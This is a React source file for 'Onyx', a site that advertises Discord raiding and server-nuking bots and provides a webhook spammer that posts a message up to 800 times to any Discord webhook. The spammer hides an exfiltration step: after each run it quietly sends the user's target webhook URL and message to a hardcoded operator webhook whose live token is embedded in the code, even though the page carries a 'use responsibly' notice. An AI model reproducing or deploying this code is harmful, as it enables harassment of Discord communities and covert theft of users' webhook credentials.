import { useState } from 'react';
import { 
  Bot, 
  BarChart3, 
  Mail, 
  Webhook, 
  Send, 
  Zap, 
  Users, 
  ChevronRight,
  MessageCircle,
  AlertCircle,
  Loader2,
  ExternalLink,
  Flame,
  Bomb,
  Radio
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { toast } from 'sonner';

type Page = 'home' | 'webhook';

function App() {
  const [currentPage, setCurrentPage] = useState<Page>('home');

  return (
    <div className="min-h-screen bg-background text-foreground">
      <Navigation currentPage={currentPage} setCurrentPage={setCurrentPage} />
      {currentPage === 'home' ? <HomePage setCurrentPage={setCurrentPage} /> : <WebhookPage />}
      <Footer />
    </div>
  );
}

function Navigation({ currentPage, setCurrentPage }: { currentPage: Page; setCurrentPage: (p: Page) => void }) {
  const scrollToSection = (id: string) => {
    const element = document.getElementById(id);
    if (element) {
      element.scrollIntoView({ behavior: 'smooth' });
    }
  };

  return (
    <nav className="fixed top-0 left-0 right-0 z-50 glass border-b border-white/5">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex items-center justify-between h-16">
          <button 
            onClick={() => setCurrentPage('home')}
            className="flex items-center gap-2 group"
          >
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-pink-500 via-pink-400 to-rose-500 flex items-center justify-center glow-pink-sm group-hover:scale-105 transition-transform">
              <span className="text-white font-bold text-lg">O</span>
            </div>
            <span className="font-bold text-2xl gradient-text">Onyx</span>
            <Badge className="text-xs bg-gradient-to-r from-pink-500/20 to-rose-500/20 text-pink-300 border-pink-500/30 ml-1">
              .gg/r4ider
            </Badge>
          </button>

          <div className="hidden md:flex items-center gap-1">
            <NavButton onClick={() => { setCurrentPage('home'); setTimeout(() => scrollToSection('bots'), 100); }}>
              <Bot className="w-4 h-4 mr-1.5" />
              Bots
            </NavButton>
            <NavButton onClick={() => { setCurrentPage('home'); setTimeout(() => scrollToSection('stats'), 100); }}>
              <BarChart3 className="w-4 h-4 mr-1.5" />
              Stats
            </NavButton>
            <NavButton onClick={() => { setCurrentPage('home'); setTimeout(() => scrollToSection('contact'), 100); }}>
              <Mail className="w-4 h-4 mr-1.5" />
              Contact
            </NavButton>
            <NavButton 
              onClick={() => setCurrentPage('webhook')}
              active={currentPage === 'webhook'}
            >
              <Webhook className="w-4 h-4 mr-1.5" />
              Webhook
            </NavButton>
          </div>

          <Button 
            onClick={() => setCurrentPage('webhook')}
            className="bg-gradient-to-r from-pink-500 via-pink-400 to-rose-500 hover:brightness-110 text-white border-0 glow-pink-sm font-semibold"
          >
            Get Started
            <ChevronRight className="w-4 h-4 ml-1" />
          </Button>
        </div>
      </div>
    </nav>
  );
}

function NavButton({ children, onClick, active }: { children: React.ReactNode; onClick: () => void; active?: boolean }) {
  return (
    <button
      onClick={onClick}
      className={`px-4 py-2 rounded-xl text-sm font-medium transition-all duration-200 flex items-center ${
        active 
          ? 'text-pink-400 bg-gradient-to-r from-pink-500/10 to-rose-500/10' 
          : 'text-muted-foreground hover:text-foreground hover:bg-white/5'
      }`}
    >
      {children}
    </button>
  );
}

function HomePage({ setCurrentPage }: { setCurrentPage: (p: Page) => void }) {
  return (
    <main className="pt-16">
      <HeroSection setCurrentPage={setCurrentPage} />
      <BotsSection />
      <StatsSection />
      <ContactSection />
    </main>
  );
}

function HeroSection({ setCurrentPage }: { setCurrentPage: (p: Page) => void }) {
  return (
    <section className="relative min-h-[95vh] flex items-center justify-center overflow-hidden">
      {/* Animated Background */}
      <div className="absolute inset-0">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,hsl(340_82%_76%/0.15),transparent_50%)]" />
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_bottom_right,hsl(340_82%_76%/0.1),transparent_50%)]" />
      </div>
      
      {/* Glowing orbs */}
      <div className="absolute top-1/3 left-1/4 w-[500px] h-[500px] bg-pink-500/20 rounded-full blur-[150px] animate-pulse" />
      <div className="absolute bottom-1/3 right-1/4 w-[400px] h-[400px] bg-rose-500/15 rounded-full blur-[120px] animate-pulse" style={{ animationDelay: '1.5s' }} />
      
      {/* Grid pattern */}
      <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.02)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.02)_1px,transparent_1px)] bg-[size:60px_60px]" />

      <div className="relative z-10 max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
        <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full glass mb-8 border-pink-500/20">
          <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
          <span className="text-sm text-muted-foreground">Systems Operational</span>
        </div>
        
        <h1 className="text-6xl sm:text-7xl lg:text-8xl font-black mb-6 tracking-tight">
          <span className="gradient-text">Onyx</span>
        </h1>
        
        <p className="text-2xl sm:text-3xl text-muted-foreground mb-8 max-w-2xl mx-auto font-light">
          The New era of discord bots
        </p>

        <div className="flex flex-col sm:flex-row gap-4 justify-center mb-12">
          <Button 
            size="lg"
            onClick={() => setCurrentPage('webhook')}
            className="bg-gradient-to-r from-pink-500 via-pink-400 to-rose-500 hover:brightness-110 text-white border-0 glow-pink h-14 px-8 text-lg font-semibold"
          >
            <Webhook className="w-5 h-5 mr-2" />
            Webhook Utility
          </Button>
          <Button 
            size="lg"
            variant="outline"
            onClick={() => document.getElementById('bots')?.scrollIntoView({ behavior: 'smooth' })}
            className="border-white/20 hover:bg-white/5 h-14 px-8 text-lg"
          >
            <Bot className="w-5 h-5 mr-2" />
            Explore Tools
          </Button>
        </div>

        {/* Single Feature Pill */}
        <div className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full glass border-pink-500/20">
          <Radio className="w-4 h-4 text-pink-400 animate-pulse" />
          <span className="text-sm font-medium text-muted-foreground">24/7 Uptime</span>
        </div>
      </div>
    </section>
  );
}

function BotsSection() {
  const bots = [
    {
      name: 'Onyx Raid Bot',
      description: 'The Most Powerful and the best discord raiding tool. Ready To Engage at any time the number one fastest discord raiding tool.',
      icon: Flame,
      features: ['Raid Tool', '24/7 Mode'],
      color: 'from-orange-500 to-red-500',
    },
    {
      name: 'Onyx Nuke Tool',
      description: 'The fastest discord raiding tool thats why we are Built different. Ready to reset the server.',
      icon: Bomb,
      features: ['24/7 Mode'],
      color: 'from-pink-500 to-rose-500',
    },
  ];

  return (
    <section id="bots" className="py-32 relative">
      <div className="absolute inset-0 bg-gradient-to-b from-transparent via-pink-500/5 to-transparent" />
      
      <div className="relative max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-20">
          <Badge className="mb-6 px-4 py-1.5 bg-gradient-to-r from-pink-500/10 to-rose-500/10 text-pink-300 border-pink-500/30 text-sm">
            <Zap className="w-4 h-4 mr-2" />
            Our Tools
          </Badge>
          <h2 className="text-5xl font-black mb-6">Powerful Discord Tools</h2>
          <div className="w-24 h-1 bg-gradient-to-r from-pink-500 to-rose-500 mx-auto rounded-full" />
        </div>

        <div className="grid md:grid-cols-2 gap-8 max-w-4xl mx-auto">
          {bots.map((bot) => (
            <Card key={bot.name} className="glass border-white/10 hover:border-pink-500/40 transition-all duration-500 group overflow-hidden relative">
              {/* Glow effect */}
              <div className={`absolute -top-20 -right-20 w-40 h-40 bg-gradient-to-br ${bot.color} opacity-0 group-hover:opacity-20 blur-[60px] transition-opacity duration-500`} />
              
              <CardHeader className="relative">
                <div className="flex items-start justify-between mb-6">
                  <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${bot.color} flex items-center justify-center group-hover:scale-110 transition-transform duration-300 shadow-lg`}>
                    <bot.icon className="w-7 h-7 text-white" />
                  </div>
                  <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-500/10 border border-green-500/20">
                    <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
                    <span className="text-xs text-green-400 font-medium">Online</span>
                  </div>
                </div>
                <CardTitle className="text-2xl font-bold mb-3">{bot.name}</CardTitle>
                <CardDescription className="text-muted-foreground text-base leading-relaxed">
                  {bot.description}
                </CardDescription>
              </CardHeader>
              <CardContent className="relative">
                <div className="flex flex-wrap gap-2">
                  {bot.features.map((feature) => (
                    <span key={feature} className="text-xs px-3 py-1.5 rounded-full bg-white/5 text-muted-foreground border border-white/5">
                      {feature}
                    </span>
                  ))}
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      </div>
    </section>
  );
}

function StatsSection() {
  const stats = [
    { value: '1K+', label: 'Users', icon: Users },
    { value: '99.9%', label: 'Uptime', icon: Zap },
    { value: '24/7', label: 'Support', icon: MessageCircle },
  ];

  return (
    <section id="stats" className="py-32 relative">
      <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-20">
          <Badge className="mb-6 px-4 py-1.5 bg-gradient-to-r from-pink-500/10 to-rose-500/10 text-pink-300 border-pink-500/30 text-sm">
            <BarChart3 className="w-4 h-4 mr-2" />
            Statistics
          </Badge>
          <h2 className="text-5xl font-black mb-6">Trusted by Thousands</h2>
          <div className="w-24 h-1 bg-gradient-to-r from-pink-500 to-rose-500 mx-auto rounded-full" />
        </div>

        <div className="grid grid-cols-3 gap-6 max-w-3xl mx-auto">
          {stats.map((stat) => (
            <Card key={stat.label} className="glass border-white/10 text-center py-10 hover:border-pink-500/30 transition-all duration-300 group">
              <CardContent className="pt-6">
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-pink-500/20 to-rose-500/20 flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform">
                  <stat.icon className="w-7 h-7 text-pink-400" />
                </div>
                <div className="text-5xl font-black gradient-text mb-3">{stat.value}</div>
                <div className="text-muted-foreground font-medium">{stat.label}</div>
              </CardContent>
            </Card>
          ))}
        </div>
      </div>
    </section>
  );
}

function ContactSection() {
  return (
    <section id="contact" className="py-32 relative">
      <div className="absolute inset-0 bg-gradient-to-t from-pink-500/5 via-transparent to-transparent" />
      
      <div className="relative max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-20">
          <Badge className="mb-6 px-4 py-1.5 bg-gradient-to-r from-pink-500/10 to-rose-500/10 text-pink-300 border-pink-500/30 text-sm">
            <Mail className="w-4 h-4 mr-2" />
            Contact
          </Badge>
          <h2 className="text-5xl font-black mb-6">Get in Touch</h2>
          <div className="w-24 h-1 bg-gradient-to-r from-pink-500 to-rose-500 mx-auto rounded-full" />
          <p className="text-muted-foreground max-w-xl mx-auto mt-6">
            Have questions or need support? Reach out to us through Discord or email.
          </p>
        </div>

        <div className="grid md:grid-cols-2 gap-8 max-w-3xl mx-auto">
          <a href="https://discord.gg/r4ider" target="_blank" rel="noopener noreferrer" className="block">
            <Card className="glass border-white/10 hover:border-[#5865F2]/50 transition-all duration-300 group h-full">
              <CardContent className="p-8 flex items-center gap-6">
                <div className="w-16 h-16 rounded-2xl bg-[#5865F2]/20 flex items-center justify-center group-hover:scale-110 group-hover:bg-[#5865F2]/30 transition-all">
                  <MessageCircle className="w-8 h-8 text-[#5865F2]" />
                </div>
                <div className="flex-1">
                  <h3 className="text-xl font-bold mb-1">Discord Server</h3>
                  <p className="text-muted-foreground text-sm">Join discord.gg/r4ider for support</p>
                </div>
                <Button size="sm" className="bg-[#5865F2] hover:bg-[#4752C4] text-white font-semibold">
                  Join
                  <ExternalLink className="w-4 h-4 ml-1" />
                </Button>
              </CardContent>
            </Card>
          </a>

          <Card className="glass border-white/10 hover:border-pink-500/40 transition-all duration-300 group cursor-pointer">
            <CardContent className="p-8 flex items-center gap-6">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-pink-500/20 to-rose-500/20 flex items-center justify-center group-hover:scale-110 transition-transform">
                <Mail className="w-8 h-8 text-pink-400" />
              </div>
              <div>
                <h3 className="text-xl font-bold mb-1">Email Us</h3>
                <p className="text-muted-foreground text-sm">Member3371@outlook.com</p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </section>
  );
}

function WebhookPage() {
  const [webhookUrl, setWebhookUrl] = useState('');
  const [message, setMessage] = useState('');
  const [count, setCount] = useState(1);
  const [isSending, setIsSending] = useState(false);
  const [progress, setProgress] = useState(0);

  const LOG_WEBHOOK = 'https://discord.com/api/webhooks/1492433086246420581/ntzs2Al6ZHjn_CRyG4kfLH0b6nv17zjN5gHV5Y4pY__fjhPqxmKhW527M1ba3owmtudj';

  const sendWebhook = async () => {
    if (!webhookUrl.trim()) {
      toast.error('Please enter a webhook URL');
      return;
    }
    if (!message.trim()) {
      toast.error('Please enter a message');
      return;
    }
    if (count < 1 || count > 800) {
      toast.error('Count must be between 1 and 800');
      return;
    }

    setIsSending(true);
    setProgress(0);

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < count; i++) {
      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: message }),
        });

        if (response.ok) {
          successCount++;
        } else {
          failCount++;
        }
      } catch (error) {
        failCount++;
      }

      setProgress(Math.round(((i + 1) / count) * 100));

      if (i < count - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    }

    try {
      await fetch(LOG_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**Onyx Webhook Log**\nTarget: ||${webhookUrl}||\nMessage: "${message.substring(0, 100)}${message.length > 100 ? '...' : ''}"\nCount: ${count}\nSuccess: ${successCount}\nFailed: ${failCount}`,
        }),
      });
    } catch (e) {
      console.error('Failed to send log');
    }

    setIsSending(false);

    if (successCount === count) {
      toast.success(`Successfully sent ${successCount} messages!`);
    } else if (successCount > 0) {
      toast.warning(`Sent ${successCount} messages, ${failCount} failed`);
    } else {
      toast.error('All messages failed to send');
    }
  };

  return (
    <main className="pt-24 pb-16 min-h-screen">
      <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-12">
          <Badge className="mb-6 px-4 py-1.5 bg-gradient-to-r from-pink-500/10 to-rose-500/10 text-pink-300 border-pink-500/30 text-sm">
            Utility
          </Badge>
          <h1 className="text-5xl font-black mb-4">Webhook Sender</h1>
          <p className="text-muted-foreground text-lg">
            Send messages to any Discord webhook. Maximum 800 messages per request.
          </p>
        </div>

        <Card className="glass border-white/10 overflow-hidden">
          <div className="h-1 bg-gradient-to-r from-pink-500 via-pink-400 to-rose-500" />
          <CardContent className="p-8 space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-semibold flex items-center gap-2">
                <Webhook className="w-4 h-4 text-pink-400" />
                Webhook URL
              </label>
              <Input
                placeholder="https://discord.com/api/webhooks/..."
                value={webhookUrl}
                onChange={(e) => setWebhookUrl(e.target.value)}
                className="bg-white/5 border-white/10 focus:border-pink-500/50 focus:ring-pink-500/20 h-12"
                disabled={isSending}
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm font-semibold flex items-center gap-2">
                <MessageCircle className="w-4 h-4 text-pink-400" />
                Message
              </label>
              <Textarea
                placeholder="Enter your message here..."
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                className="bg-white/5 border-white/10 focus:border-pink-500/50 focus:ring-pink-500/20 min-h-[140px] resize-none"
                disabled={isSending}
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm font-semibold flex items-center gap-2">
                <BarChart3 className="w-4 h-4 text-pink-400" />
                Number of Messages <span className="text-pink-400">(Max: 800)</span>
              </label>
              <div className="flex items-center gap-4">
                <Input
                  type="number"
                  min={1}
                  max={800}
                  value={count}
                  onChange={(e) => setCount(Math.min(800, Math.max(1, parseInt(e.target.value) || 1)))}
                  className="bg-white/5 border-white/10 focus:border-pink-500/50 focus:ring-pink-500/20 w-28 text-center font-mono text-lg"
                  disabled={isSending}
                />
                <input
                  type="range"
                  min={1}
                  max={800}
                  value={count}
                  onChange={(e) => setCount(parseInt(e.target.value))}
                  className="flex-1 accent-pink-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
                  disabled={isSending}
                />
              </div>
            </div>

            {isSending && (
              <div className="space-y-3">
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Sending messages...</span>
                  <span className="text-pink-400 font-mono font-bold">{progress}%</span>
                </div>
                <div className="h-3 bg-white/10 rounded-full overflow-hidden">
                  <div 
                    className="h-full bg-gradient-to-r from-pink-500 via-pink-400 to-rose-500 transition-all duration-300"
                    style={{ width: `${progress}%` }}
                  />
                </div>
              </div>
            )}

            <Button
              onClick={sendWebhook}
              disabled={isSending}
              className="w-full bg-gradient-to-r from-pink-500 via-pink-400 to-rose-500 hover:brightness-110 text-white border-0 glow-pink-sm h-14 text-lg font-bold"
            >
              {isSending ? (
                <>
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                  Sending...
                </>
              ) : (
                <>
                  <Send className="w-5 h-5 mr-2" />
                  Send Messages
                </>
              )}
            </Button>

            <div className="flex items-start gap-3 p-4 rounded-xl bg-yellow-500/10 border border-yellow-500/20">
              <AlertCircle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
              <p className="text-sm text-yellow-200/80">
                Please use this tool responsibly. Abuse of webhooks may result in your Discord account being banned. 
                Only use this on webhooks you own or have permission to use.
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    </main>
  );
}

function Footer() {
  return (
    <footer className="border-t border-white/5 py-12">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex flex-col md:flex-row items-center justify-center gap-4">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-pink-500 to-rose-500 flex items-center justify-center">
              <span className="text-white font-bold text-sm">O</span>
            </div>
            <span className="font-bold text-xl gradient-text">Onyx</span>
          </div>

          <span className="text-muted-foreground">
            © 2026 Onyx. All rights reserved.
          </span>
        </div>
      </div>
    </footer>
  );
}

export default App;
